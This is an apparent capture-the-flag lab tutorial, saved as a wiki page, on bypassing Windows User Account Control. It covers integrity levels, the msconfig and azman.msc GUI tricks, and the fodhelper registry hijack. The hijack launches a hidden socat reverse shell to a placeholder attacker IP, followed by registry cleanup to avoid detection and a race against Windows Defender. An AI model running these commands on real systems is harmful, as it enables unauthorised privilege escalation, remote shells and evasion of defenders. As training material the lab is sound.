@@ -1,0 +1,477 @@
+<!--
+title: Bypassing UAC
+description: 
+published: true
+date: 2023-01-05T20:52:49.231Z
+tags: 
+editor: ckeditor
+dateCreated: 2023-01-05T20:52:49.231Z
+-->
+
+<h1>Introduction</h1>
+<p>n this room, we will be looking at common ways to bypass a security feature available to Windows systems known as&nbsp;<strong>User Account Control (UAC).</strong>&nbsp;This feature allows for any process to be run with low privileges independent of who runs it (either a regular user or an admin).</p>
+<p>From an attacker's perspective, bypassing UAC is essential to breaking out of highly restrictive environments and fully elevating privileges on target hosts. While learning the bypass techniques, we will also look at any alerts that could be triggered and artefacts that may be created on the target system that the blue team could detect.</p>
+<h1>User Account Control (UAC)</h1>
+<h3>What is UAC?</h3>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4c9e08e46fb545bd16f1c648e2956a34.png"></figure>
+<p>User Account Control (UAC) is a Windows security feature that forces any new process to run in the security context of a non-privileged account by default. This policy applies to processes started by any user, including administrators themselves. The idea is that we can't solely rely on the user's identity to determine if some actions should be authorized.</p>
+<p>Although this may seem counterintuitive, imagine the case where user BOB unknowingly downloads a malicious application from the Internet. If BOB is a part of the Administrators group, any application he launches will inherit its access token privileges. So if BOB decides to launch the malicious application and UAC is disabled, the malicious application would gain administrator privileges instantly. Instead, the malicious application will be restricted to a non-administrative access token when UAC is enabled.</p>
+<h3>UAC Elevation</h3>
+<p>If an administrator is required to perform a privileged task, UAC provides a way to elevate privileges. <strong>Elevation</strong> works by presenting a simple dialogue box to the user to confirm that they explicitly approve running the application in an administrative security context:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8088062c5a8e61407d343186bba02596.png"></figure>
+<h3>Integrity Levels</h3>
+<p>UAC is a <strong>Mandatory Integrity Control (MIC)</strong>, which is a mechanism that allows differentiating users, processes and resources by assigning an <strong>Integrity Level (IL)</strong> to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs, so you may be authorized to access a resource according to the DACL, but it won't matter if your IL isn't high enough.</p>
+<p>The following 4 ILs are used by Windows, ordered from lowest to highest:<br>&nbsp;</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Integrity Level</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Use</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Low</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Medium</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Assigned to standard users and Administrators' filtered tokens.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">High</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token.<br>&nbsp;</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">System</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Reserved for system use.</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>When a process requires to access a resource, it will inherit the calling user's access token and its associated IL. The same occurs if a process forks a child.</p>
+<h3>Filtered Tokens</h3>
+<p>To accomplish this separation of roles, UAC treats regular users and administrators in a slightly different way during logon:</p>
+<ul>
+  <li><strong>Non-administrators</strong> will receive a single access token when logged in, which will be used for all tasks performed by the user. This token has Medium IL.</li>
+  <li><strong>Administrators</strong> will receive two access tokens:<ul>
+      <li><strong>Filtered Token:</strong> A token with Administrator privileges stripped, used for regular operations. This token has Medium IL.</li>
+      <li><strong>Elevated Token:</strong> A token with full Administrator privileges, used when something needs to be run with administrative privileges. This token has High IL.</li>
+    </ul>
+  </li>
+</ul>
+<p>In this way, administrators will use their filtered token unless they explicitly request administrative privileges via UAC.</p>
+<h3>Opening an Application the Usual Way</h3>
+<p>When trying to open a regular console, we can either open it as a non-privileged user or as an administrator. Depending on our choice, either a Medium or High integrity level token will be assigned to the spawned process:</p>
+<figure class="image image_resized" style="width:873px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/85532945ffd962373592d21f1720ee39.png"></figure>
+<p>If we analyze both processes using Process Hacker, we can see the associated tokens and their differences :</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/605235aa87c2f39689d0396bb3603967.png"></figure>
+<p>On the left, you have a filtered token with medium IL and almost no privileges assigned. On the right, you can see that the process runs with high IL and has many more privileges available. Another difference that may not be so obvious is that the medium IL process is effectively denied any privileges related to being part of the Administrators group.</p>
+<h3>UAC Settings</h3>
+<p>Depending on our security requirements, UAC can be configured to run at four different notification levels:</p>
+<ul>
+  <li><strong>Always notify:</strong> Notify and prompt the user for authorization when making changes to Windows settings or when a program tries to install applications or make changes to the computer.</li>
+  <li><strong>Notify me only when programs try to make changes to my computer:</strong> Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators won't be prompted when changing Windows settings.</li>
+  <li><strong>Notify me only when programs try to make changes to my computer (do not dim my desktop): </strong>Same as above, but won't run the UAC prompt on a secure desktop.<br>&nbsp;</li>
+  <li><strong>Never notify:</strong> Disable UAC prompt. Administrators will run everything using a high privilege token.</li>
+</ul>
+<p>By default, UAC is configured on the&nbsp;<strong>Notify me only when programs try to make changes to my computer</strong> level:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/143a6c0fd6725edaee0f3d5c707e97f0.png"></figure>
+<p>From an attacker's perspective, the three lower security levels are equivalent, and only the Always notify setting presents a difference.</p>
+<h3>UAC Internals</h3>
+<p>At the heart of UAC, we have the <strong>Application Information Service</strong> or <strong>Appinfo</strong>. Whenever a user requires elevation, the following occurs:</p>
+<ol>
+  <li>The user requests to run an application as administrator.</li>
+  <li>A <strong>ShellExecute</strong> API call is made using the <strong>runas</strong> verb.</li>
+  <li>The request gets forwarded to Appinfo to handle elevation.</li>
+  <li>The application manifest is checked to see if AutoElevation is allowed (more on this later).</li>
+  <li>Appinfo executes <strong>consent.exe</strong>, which shows the UAC prompt on a <strong>secure desktop</strong>. A secure desktop is simply a separate desktop that isolates processes from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt in any way.</li>
+  <li>If the user gives consent to run the application as administrator, the Appinfo service will execute the request using a user's Elevated Token. Appinfo will then set the parent process ID of the new process to point to the shell from which elevation was requested.</li>
+</ol>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fce906f0e438efa938753430e5d25afe.png"></figure>
+<h3>Bypassing UAC</h3>
+<p>From an attacker's perspective, there might be situations where you get a remote shell to a Windows host via Powershell or cmd.exe. You might even gain access through an account that is part of the Administrators group, but when you try creating a backdoor user for future access, you get the following error:</p>
+<p>Powershell</p>
+<pre><code class="language-plaintext">PS C:\Users\attacker&gt; net user backdoor Backd00r /add
+System error 5 has occurred.
+
+Access is denied.</code></pre>
+<p>By checking our assigned groups, we can confirm that our session is running with a medium IL, meaning we are effectively using a filtered token:&nbsp;</p>
+<p>Powershell</p>
+<pre><code class="language-plaintext">PS C:\Users\attacker&gt; whoami /groups
+	
+GROUP INFORMATION
+-----------------
+
+Group Name                                                    Attributes
+============================================================= ==================================================
+Everyone                                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account and member of Administrators group Group used for deny only
+BUILTIN\Administrators                                        Group used for deny only
+BUILTIN\Users                                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users                              Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization                                Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account                                    Mandatory group, Enabled by default, Enabled group
+LOCAL                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication                              Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level</code></pre>
+<p>Even when we get a Powershell session with an administrative user, UAC prevents us from performing any administrative tasks as we are currently using a filtered token only. If we want to take full control of our target, we must bypass UAC.</p>
+<p>Interestingly enough, Microsoft doesn't consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense, the UAC prompt is more of a reminder to the user that they are running with high privileges rather than impeding a piece of malware or an attacker from doing so. Since it isn't a security boundary, any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.</p>
+<p>Generally speaking, most of the bypass techniques rely on us being able to leverage a High IL process to execute something on our behalf. Since any process created by a High IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the UAC prompt.</p>
+<p>For all the scenarios presented in this room, we assume we have access to the server with an administrative account but from a Medium IL console only. Our goal will always be to access a High IL console without going through UAC.</p>
+<h1>UAC: GUI based bypasses</h1>
+<p>We will start by looking at GUI-based bypasses, as they provide an easy way to understand the basic concepts involved. These examples are not usually applicable to real-world scenarios, as they rely on us having access to a graphical session, from where we could use the standard UAC to elevate.</p>
+<p>Click the Start Machine button to deploy your VM and connect to it via RDP or in the side by side view in Browser:</p>
+<p><code>xfreerdp /v:MACHINE_IP /u:attacker /p:Password321</code></p>
+<p>This machine will be used for all tasks in the room.</p>
+<h3>Case study: msconfig</h3>
+<p>Our goal is to obtain access to a High IL command prompt without passing through UAC. First, let's start by opening msconfig, either from the start menu or the "Run" dialog:<br>&nbsp;</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/30570f96439f9de572fe97ba508ccdfa.png"></figure>
+<p>If we analyze the msconfig process with Process Hacker (available on your desktop), we notice something interesting. Even when no UAC prompt was presented to us, msconfig runs as a high IL process:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/478a3577ffcd0c186529d9edd34545f4.png"></figure>
+<p>This is possible thanks to a feature called auto elevation that allows specific binaries to elevate without requiring the user's interaction. More details on this later.</p>
+<p>If we could force msconfig to spawn a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the Tools tab, we can find an option to do just that:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/efbc49a8c7acfe3f296d0cb46cd2f75a.png"></figure>
+<p>If we click Launch, we will obtain a high IL command prompt without interacting with UAC in any way.</p>
+<p>To retrieve the msconfig flag, use the obtained high integrity console to execute:</p>
+<p>Administrator: Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; C:\flags\GetFlag-msconfig.exe</code></pre>
+<p>Case study: azman.msc</p>
+<p>As with msconfig, azman.msc will auto elevate without requiring user interaction. If we can find a way to spawn a shell from within that process, we will bypass UAC. Note that, unlike msconfig, azman.msc has no intended built-in way to spawn a shell. We can easily overcome this with a bit of creativity.</p>
+<p>First, let's run azman.msc:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/769ef59be8fc62884e69a0b39422b2a5.png"></figure>
+<p>We can confirm that a process with high IL was spawned by using Process Hacker. Notice that all .msc files are run from mmc.exe (Microsoft Management Console):</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2fd110f80a236ea5bbb06518b519b440.png"></figure>
+<p>To run a shell, we will abuse the application's help:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2f1aef0aa39ffcf9056999c939e43b8d.png"></figure>
+<p>On the help screen, we will right-click any part of the help article and select <strong>View Source</strong>:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/43e3967d4cdb4c30dc46e7ce81eb2825.png"></figure>
+<p>This will spawn a notepad process that we can leverage to get a shell. To do so, go to <strong>File-&gt;Open</strong> and make sure to select <strong>All Files</strong> in the combo box on the lower right corner. Go to <code>C:\Windows\System32</code> and search for <code>cmd.exe</code> and right-click to select Open:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8ae24b569d5d95119e79feb425e1b7ff.png"></figure>
+<p>This will once again bypass UAC and give us access to a high integrity command prompt. You can check the process tree in Process Hacker to see how the high integrity token is passed from mmc (Microsoft Management Console, launched through the Azman), all the way to cmd.exe:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7fb637209e08c712615b992b9d0533ca.png"></figure>
+<p>To retrieve the azman flag, use the obtained high integrity console to execute:</p>
+<p>Administrator: Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; C:\flags\GetFlag-azman.exe</code></pre>
+<h1>UAC: Auto-Elevating Processes</h1>
+<h3>AutoElevate</h3>
+<p>As mentioned before, some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows.</p>
+<p>For an application, some requirements need to be met to auto-elevate:</p>
+<ul>
+  <li>The executable must be signed by the Windows Publisher</li>
+  <li>The executable must be contained in a trusted directory, like <code>%SystemRoot%/System32/</code> or <code>%ProgramFiles%/</code></li>
+</ul>
+<p>Depending on the type of application, additional requirements may apply:</p>
+<ul>
+  <li>Executable files (.exe) must declare the <strong>autoElevate</strong> element inside their manifests. To check a file's manifest, we can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck"><strong>sigcheck</strong></a>, a tool provided as part of the Sysinternals suite. You can find a copy of sigcheck on your machine on <code>C:\tools\</code>&nbsp;. If we check the manifest for msconfig.exe, we will find the autoElevate property:</li>
+</ul>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\tools\&gt; sigcheck64.exe -m c:/windows/system32/msconfig.exe
+...
+&lt;asmv3:application&gt;
+	&lt;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;
+		&lt;dpiAware&gt;true&lt;/dpiAware&gt;
+		&lt;autoElevate&gt;true&lt;/autoElevate&gt;
+	&lt;/asmv3:windowsSettings&gt;
+&lt;/asmv3:application&gt;</code></pre>
+<ul>
+  <li>mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate.</li>
+  <li>Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe, for example.</li>
+  <li>COM objects can also request auto-elevation by configuring some registry keys (<a href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker">https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker</a>).</li>
+</ul>
+<h3>Case study: Fodhelper</h3>
+<p>Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won't be prompted for elevation when performing standard administrative tasks. While we've already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.<br>&nbsp;</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/705cefc6711f050b45a6f1af4019a679.png"></figure>
+<p>From an attacker's perspective, this means it can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process. This particular technique was discovered by <a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/">@winscripting</a> and has been used in the wild by the <a href="https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit">Glupteba malware</a>.</p>
+<p>What was noticed about fodhelper is that it searches the registry for a specific key of interest:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb7ac876cd05f51495f9882fa00ef832.png"></figure>
+<p>When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID (<strong>ProgID</strong>) for each filetype, where the corresponding application is associated. Let's say you try to open an HTML file. A part of the registry known as the <strong>HKEY_CLASSES_ROOT</strong> will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the <code>shell/open/command</code> subkey for each file's ProgID. Taking the "htmlfile" ProgID as an example:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2428d786ec68d8731dc98b6598211eb9.png"></figure>
+<p>In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on the registry:</p>
+<figure class="table" style="width:1164px;">
+  <table style="background-color:rgb(255, 255, 255);border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Path</strong></td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;"><strong>Description</strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">HKEY_LOCAL_MACHINE\Software\Classes<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">System-wide file associations</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">HKEY_CURRENT_USER\Software\Classes<br>&nbsp;</td>
+        <td style="border-bottom:1px solid rgb(222, 226, 230);border-left:1px solid rgb(222, 226, 230);border-right:1px solid rgb(222, 226, 230);border-top:1px solid rgb(222, 226, 230);padding:0.75rem;">Active user's file associations</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>When checking HKEY_CLASSES_ROOT, if there is a user-specific association at <strong>HKEY_CURRENT_USER (HKCU)</strong>, it will take priority. If no user-specific association is configured, then the system-wide association at <strong>HKEY_LOCAL_MACHINE (HKLM)</strong> will be used instead.&nbsp;This way, each user can choose their preferred applications separately if desired.</p>
+<p>Going back to fodhelper, we now see that it's trying to open a file under the ms-settings ProgID. By creating an association for that ProgID in the current user's context under HKCU, we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC.</p>
+<h3>Putting it all together</h3>
+<p>One of our agents has planted a backdoor on the target server for your convenience. He managed to create an account within the Administrators group, but UAC is preventing the execution of any privileged tasks. To retrieve the flag, he needs you to bypass UAC and get a fully functional high IL shell.</p>
+<p>To connect to the backdoor, you can use the following command:</p>
+<pre><code class="language-plaintext">nc MACHINE_IP 9999</code></pre>
+<p>Once connected, we check if our user is part of the Administrators group and that it is running with a medium integrity token:</p>
+<p>Attacker's Shell</p>
+<pre><code class="language-plaintext">user@kali$ nc MACHINE_IP 9999
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+myserver\attacker
+
+C:\Windows\system32&gt;net user attacker | find "Local Group"
+Local Group Memberships      *Administrators       *Users                
+
+C:\Windows\system32&gt;whoami /groups | find "Label"
+Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192</code></pre>
+<p>We set the required registry values to associate the ms-settings class to a reverse shell. For your convenience, a copy of <strong>socat</strong> can be found on <code>c:\tools\socat\</code>. You can use the following commands to set the required registry keys from a standard command line:</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"
+
+C:\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+The operation completed successfully.
+
+C:\&gt; reg add %REG_KEY% /d %CMD% /f
+The operation completed successfully.</code></pre>
+<p>Notice how we need to create an empty value called <strong>DelegateExecute</strong> for the class association to take effect. If this registry value is not present, the operating system will ignore the command and use the system-wide class association instead.</p>
+<p>We set up a listener by using netcat in our machine:</p>
+<p><code>nc -lvp 4444</code></p>
+<p>And then proceed to execute <strong>fodhelper.exe</strong>, which in turn will trigger the execution of our reverse shell:<br>&nbsp;</p>
+<figure class="table">
+  <table style="background-color:rgb(255, 255, 255);">
+    <tbody>
+      <tr>
+        <td style="width:523.797px;">
+          <p>Command Prompt</p>
+          <pre><code class="language-plaintext">C:\&gt; fodhelper.exe
+
+
+
+
+
+
+
+
+</code></pre>
+        </td>
+        <td>➜</td>
+        <td style="width:523.797px;">
+          <p>Attacker's Shell</p>
+          <pre><code class="language-plaintext">user@kali$ nc -lvp 4444      
+Listening on 0.0.0.0 4444
+Connection received on 10.10.183.127 49813
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>The received shell runs with high integrity, indicating we have successfully bypassed UAC.</p>
+<p>To retrieve the fodhelper flag, use your new shell to execute:</p>
+<p>Administrator: Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; C:\flags\GetFlag-fodhelper.exe</code></pre>
+<p><strong>Note: Keep in mind that the flag will only be returned if you successfully&nbsp;bypassed UAC via fodhelper and only from the resulting high integrity shell.</strong></p>
+<h3>Clearing our tracks</h3>
+<p>As a result of executing this exploit, some artefacts were created on the target system in the form of registry keys. To avoid detection, we need to clean up after ourselves with the following command:</p>
+<pre><code class="language-plaintext">reg delete HKCU\Software\Classes\ms-settings\ /f</code></pre>
+<p><strong>Note: Be sure to execute the given command to avoid any artefact interfering with the following tasks.</strong></p>
+<h1>UAC: Improving the Fodhelper Exploit to Bypass Windows Defender</h1>
+<h3>Windows Defender<br>&nbsp;</h3>
+<p>For simplicity, the machine we are targeting has Windows Defender disabled. But what would happen if it was enabled?</p>
+<p>First, using your GUI connection, go to your desktop and double-click the following icon to enable Windows Defender:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a138ccd399c27bb922efcc266053c3a3.png"></figure>
+<p>Now try exploiting fodhelper again through the backdoor connection and see what happens on the server's GUI. Just as you change the <code>(default)</code> value in <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code> to insert your reverse shell command, a Windows Defender notification will pop up:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ebebccbac675f6b66f98a16446d1859.png"></figure>
+<p>By clicking the notification, we can check the details on the alert, which mention a UAC bypass attempt by modifying a registry value:</p>
+<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8faadca4b214e13d32a6e7979554dcdc.png"></figure>
+<p>If you query the corresponding value on the registry, you will notice it has been erased:</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\Windows\system32&gt;reg query %REG_KEY% /v ""
+
+HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
+    (Default)    REG_SZ    (value not set)</code></pre>
+<p>Although by now it would seem our exploit wouldn't work with Windows Defender enabled, check what happens if you run the same commands but with a slight modification (be sure to replace your IP address where needed):</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"
+
+C:\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+The operation completed successfully.
+
+C:\&gt; reg add %REG_KEY% /d %CMD% /f &amp; reg query %REG_KEY%
+HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
+    DelegateExecute    REG_SZ    
+    (Default)    REG_SZ    powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes</code></pre>
+<p>We have added a quick query to the offending registry value right after setting it to the command required for our reverse shell. Surprisingly, the query outputs our command intact.&nbsp;We still get alerted by Windows Defender, and a second later, the offending registry value gets deleted as expected. It appears it takes a moment for Windows Defender to take action on our exploit, so let's set a reverse listener on our attacker's machine:</p>
+<pre><code class="language-plaintext">nc -lvp 4444</code></pre>
+<p>And modify the exploit to run fodhelper.exe immediately after setting the registry value. If the command runs quick enough, it will just work&nbsp;(be sure to replace your IP address where needed):</p>
+<p>Command Prompt</p>
+<pre><code class="language-plaintext">C:\&gt; set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
+C:\&gt; set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:&lt;attacker_ip&gt;:4444 EXEC:cmd.exe,pipes"
+
+C:\&gt; reg add %REG_KEY% /v "DelegateExecute" /d "" /f
+The operation completed successfully.
+
+C:\&gt; reg add %REG_KEY% /d %CMD% /f &amp; fodhelper.exe</code></pre>
+<p>Depending on your luck, fodhelper might execute before the AV kicks in, giving you back a reverse shell. If for some reason it doesn't work for you, keep in mind that this method is unreliable as it depends on a race between the AV and your payload executing first. Should the reverse shell not work, just go ahead and continue with the rest of the room, as a more consistent way to bypass Windows Defender will be given below.</p>
+<p>Attacker's Shell</p>
+<pre><code class="language-plaintext">user@kali$ nc -lvp 4444      
+Listening on 0.0.0.0 4444
+Connection received on 10.10.183.127 49813
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami /groups | find "Label"
+Mandatory Label\High Mandatory Level                          Label            S-1-16-12288</code></pre>
+<p>Windows Defender still alerts about the bypass, however. The problem with our current exploit is that it gives little room for variation, as we need to write specific registry keys for it to trigger, making it easy for Windows Defender to detect. But there is still something to be done about it.</p>
+<h3>Improving the fodhelper exploit</h3>
+<p>A variation on the fodhelper exploit was proposed by <a href="https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses">@V3ded</a>, where different registry keys are used, but the basic principle is the same.</p>
+<p>Instead of writing our payload into <code>HKCU\Software\Classes\ms-settings\Shell\Open\command</code>, we will use the <code>CurVer</code> entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system. CurVer allows you to point to the default version of the application to be used by Windows when opening a given file type.</p>
+<p>To this end, we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.</p>
+<p>The exploit code proposed by @V3ded uses Powershell to achieve this end. Here is a modified version of it adapted to use our reverse shell&nbsp;(be sure to replace your IP address where needed):</p>
